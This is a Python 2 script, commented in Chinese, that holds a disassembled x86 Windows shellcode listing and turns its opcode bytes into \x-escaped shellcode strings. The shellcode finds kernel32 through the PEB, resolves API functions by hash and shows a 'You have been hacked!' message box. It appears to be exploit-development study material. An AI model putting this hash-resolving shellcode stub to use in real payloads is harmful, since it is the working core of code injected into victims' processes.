#coding=utf-8 
import re

text = """

00401028 FC                   cld
7:            push    0x1e380a6a          //MessageBoxA的hash值
00401029 68 6A 0A 38 1E       push        1E380A6Ah
8:            push    0x4fd18963          //ExitProcess的hash值
0040102E 68 63 89 D1 4F       push        4FD18963h
9:            push    0x0c917432          //LoadLibraryA的hash值
00401033 68 32 74 91 0C       push        0C917432h
10:           mov     esi,esp             //esi保存的是栈顶第一个函数，即LoadLibraryA的hash值
00401038 8B F4                mov         esi,esp
11:           lea     edi,[esi-0xc]
0040103A 8D 7E F4             lea         edi,[esi-0Ch]
12:   // ==== 开辟一些桟空间 ====
13:           xor     ebx,ebx             //将ebx清零
0040103D 33 DB                xor         ebx,ebx
14:           mov     bh,0x04             //此时ebx为0x400
0040103F B7 04                mov         bh,4
15:           sub     esp,ebx             //开辟0x400大小的空间
00401041 2B E3                sub         esp,ebx
16:   // ==== 压入"user32.dll" ====
17:           mov     bx,0x3233
00401043 66 BB 33 32          mov         bx,offset main+35h (00401045)
18:           push    ebx                 //压入字符"32"
00401047 53                   push        ebx
19:           push    0x72657375          //压入字符"user"
00401048 68 75 73 65 72       push        72657375h
20:           push    esp
0040104D 54                   push        esp
21:           xor     edx,edx             //将edx清零
0040104E 33 D2                xor         edx,edx
22:   // ==== 查找kernel32.dll的基地址 ====
23:           mov     ebx,fs:[edx+0x30]  // [TEB+0x30]是PEB的位置
00401050 64 8B 5A 30          mov         ebx,dword ptr fs:[edx+30h]
24:           mov     ecx,[ebx+0xC]    // [PEB+0xC]是PEB_LDR_DATA的位置
00401054 8B 4B 0C             mov         ecx,dword ptr [ebx+0Ch]
25:           mov     ecx,[ecx+0x1C]   // [PEB_LDR_DATA+0x1C]是InInitializationOrderModuleList的位置
00401057 8B 49 1C             mov         ecx,dword ptr [ecx+1Ch]
26:           mov     ecx,[ecx]        // 进入链表第一个就是ntdll.dll
0040105A 8B 09                mov         ecx,dword ptr [ecx]
27:           mov     ebp,[ecx+0x8]     // ebp保存的是kernel32.dll的基地址
0040105C 8B 69 08             mov         ebp,dword ptr [ecx+8]
28:
29:       find_lib_funtions:
30:           lodsd
0040105F AD                   lods        dword ptr [esi]
31:           cmp     eax,0x1e380a6a      //与MessageBoxA的hash值进行比较
00401060 3D 6A 0A 38 1E       cmp         eax,1E380A6Ah
32:           jne     find_functions      //如果不相等，则继续查找
00401065 75 05                jne         find_functions (0040106c)
33:           xchg    eax,ebp
00401067 95                   xchg        eax,ebp
34:           call    [edi-0x8]
00401068 FF 57 F8             call        dword ptr [edi-8]
35:           xchg    eax,ebp
0040106B 95                   xchg        eax,ebp
36:
37:   // ==== 在PE文件中查找相应的API函数 ====
38:       find_functions:
39:           pushad                      // 保护所有寄存器中的内容
0040106C 60                   pushad
40:           mov  eax,[ebp+0x3C]  // PE头
0040106D 8B 45 3C             mov         eax,dword ptr [ebp+3Ch]
41:           mov  ecx,[ebp+eax+0x78] // 导出表的指针
00401070 8B 4C 05 78          mov         ecx,dword ptr [ebp+eax+78h]
42:           add  ecx,ebp
00401074 03 CD                add         ecx,ebp
43:           mov  ebx,[ecx+0x20]  // 导出函数的名字列表
00401076 8B 59 20             mov         ebx,dword ptr [ecx+20h]
44:           add  ebx,ebp
00401079 03 DD                add         ebx,ebp
45:           xor  edi,edi             // 清空edi中的内容，用作索引
0040107B 33 FF                xor         edi,edi
46:   // ==== 循环读取导出表函数 ====
47:       next_function_loop:
48:           inc  edi                 // edi不断自增，作为索引
0040107D 47                   inc         edi
49:           mov     esi,[ebx+edi*4]     // 从列表数组中读取
0040107E 8B 34 BB             mov         esi,dword ptr [ebx+edi*4]
50:           add  esi,ebp       // esi保存的是函数名称所在地址
00401081 03 F5                add         esi,ebp
51:           cdq                         // 把edx的每一位置成eax的最高位，再把edx扩展为eax的高位，即变为64位
00401083 99                   cdq
52:
53:   // ==== hash值的计算 ====
54:       hash_loop:
55:           movsx eax,byte ptr[esi]   // 每次取出一个字符放入eax中
00401084 0F BE 06             movsx       eax,byte ptr [esi]
56:           cmp  al,ah            // 验证eax是否为0x0，即结束符
00401087 3A C4                cmp         al,ah
57:           jz  compare_hash    // 如果上述结果为零，说明hash值计算完毕，则进行hash值的比较
00401089 74 08                je          compare_hash (00401093)
58:           ror     edx,7               // 如果cmp的结果不为零，则进行循环右移7位的操作
0040108B C1 CA 07             ror         edx,7
59:           add  edx,eax             // 将循环右移的值不断累加
0040108E 03 D0                add         edx,eax
60:           inc  esi                 // esi自增，用于读取下一个字符
00401090 46                   inc         esi
61:           jmp  hash_loop           // 跳到hash_loop的位置继续计算
00401091 EB F1                jmp         hash_loop (00401084)
62:   // ==== hash值的比较 ====
63:       compare_hash:
64:           cmp     edx,[esp+0x1c]
00401093 3B 54 24 1C          cmp         edx,dword ptr [esp+1Ch]
65:           jnz     next_function_loop
00401097 75 E4                jne         next_function_loop (0040107d)
66:           mov     ebx,[ecx+0x24]
00401099 8B 59 24             mov         ebx,dword ptr [ecx+24h]
67:           add     ebx,ebp
0040109C 03 DD                add         ebx,ebp
68:           mov     di,[ebx+2*edi]
0040109E 66 8B 3C 7B          mov         di,word ptr [ebx+edi*2]
69:           mov     ebx,[ecx+0x1c]
004010A2 8B 59 1C             mov         ebx,dword ptr [ecx+1Ch]
70:           add     ebx,ebp
004010A5 03 DD                add         ebx,ebp
71:           add     ebp,[ebx+4*edi]
004010A7 03 2C BB             add         ebp,dword ptr [ebx+edi*4]
72:           xchg    eax,ebp
004010AA 95                   xchg        eax,ebp
73:           pop     edi
004010AB 5F                   pop         edi
74:           stosd
004010AC AB                   stos        dword ptr [edi]
75:           push    edi
004010AD 57                   push        edi
76:           popad
004010AE 61                   popad
77:           cmp     eax,0x1e380a6a
004010AF 3D 6A 0A 38 1E       cmp         eax,1E380A6Ah
78:           jne     find_lib_funtions
004010B4 75 A9                jne         find_lib_funtions (0040105f)
79:
80:   // ==== hash值的比较 ====
81:       funtion_call:
82:       sub esp,0x50
004010B6 83 EC 50             sub         esp,50h
83:       xor ebx,ebx
004010B9 33 DB                xor         ebx,ebx
84:       push ebx     // cut string
004010BB 53                   push        ebx
85:       push 0x20676e69
004010BC 68 69 6E 67 20       push        20676E69h
86:       push 0x6e726157    // push "Warning"
004010C1 68 57 61 72 6E       push        6E726157h
87:       mov eax,esp
004010C6 8B C4                mov         eax,esp
88:       push ebx             // cut string
004010C8 53                   push        ebx
89:       push 0x2020292e
004010C9 68 2E 29 20 20       push        2020292Eh
90:       push 0x592e4a20
004010CE 68 20 4A 2E 59       push        592E4A20h
91:       push 0x79622821
004010D3 68 21 28 62 79       push        79622821h
92:       push 0x64656b63
004010D8 68 63 6B 65 64       push        64656B63h
93:       push 0x6168206e
004010DD 68 6E 20 68 61       push        6168206Eh
94:       push 0x65656220
004010E2 68 20 62 65 65       push        65656220h
95:       push 0x65766168
004010E7 68 68 61 76 65       push        65766168h
96:       push 0x20756f59    // push "You have been hacked!(by J.Y.)"
004010EC 68 59 6F 75 20       push        20756F59h
97:       mov ecx,esp
004010F1 8B CC                mov         ecx,esp
98:       push ebx
004010F3 53                   push        ebx
99:       push eax
004010F4 50                   push        eax
100:      push ecx
004010F5 51                   push        ecx
101:      push ebx
004010F6 53                   push        ebx
102:      call [edi-0x04]           // call MessageBox
004010F7 FF 57 FC             call        dword ptr [edi-4]
103:      push ebx
004010FA 53                   push        ebx
104:      call [edi-0x08]            // call ExitProcess
004010FB FF 57 F8             call        dword ptr [edi-8]


"""
m = re.findall("00\w\w\w\w\w\w.+", text)

sum = 0
for i in m:
    PStr = i[0:30]
    Bstr = i[30:]
    PStr = re.sub('00\w\w\w\w\w\w', '', PStr)
    arr = PStr.strip().split(' ')
    LinkStr = '"'
    for i in arr:
        sum = sum + 1
        LinkStr += '\\' + 'x' + i
    LinkStr += '"'
    #LinkStr = LinkStr.ljust(40)
    #LinkStr = LinkStr[:40] + '//' +Bstr
    
    print LinkStr
    
print sum